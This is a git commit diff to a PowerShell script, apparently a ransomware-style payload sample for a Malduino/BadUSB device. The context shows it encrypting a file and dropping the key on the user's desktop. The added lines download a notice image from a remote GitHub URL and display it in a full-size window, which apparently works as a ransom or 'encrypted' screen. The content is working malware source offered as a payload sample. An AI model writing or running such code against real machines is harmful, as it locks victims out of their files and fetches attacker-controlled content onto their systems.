cdd34d5138c5f688cfc76f5424ceb62a3394dccf
Paulo C. Marcon <pcmarcon@gmail.com>
2021-07-31 20:57:03 -0300

    Update single_file_enc.ps1

--- single_file_enc.ps1
+++ single_file_enc.ps1
@@ -36,4 +36,25 @@ $bytes = $Null
 # write encryption key on user's desktop
 $userDesk = [Environment]::GetFolderPath("Desktop")
 sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
+#
+# show encryption screen
+$screen = $ENV:LOCALAPPDATA + ‘\screen_enc.jpg’; 
+(New-Object System.Net.WebClient).DownloadFile(‘https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg', $screen)
+[void][reflection.assembly]::LoadWithPartialName("System.Windows.Forms")
+Add-Type -AssemblyName 'System.Windows.Forms'
+#$file = (get-item '\\192.168.1.127\Documents\ataque\screen.png')
+$img = [System.Drawing.Image]::Fromfile((get-item $screen))
 
+[System.Windows.Forms.Application]::EnableVisualStyles()
+$form = new-object Windows.Forms.Form
+$form.Text = "Image Viewer"
+$form.Width = $img.Size.Width;
+$form.Height =  $img.Size.Height;
+$pictureBox = new-object Windows.Forms.PictureBox
+$pictureBox.Width =  $img.Size.Width;
+$pictureBox.Height =  $img.Size.Height;
+
+$pictureBox.Image = $img;
+$form.controls.add($pictureBox)
+$form.Add_Shown( { $form.Activate() } )
+$form.ShowDialog()
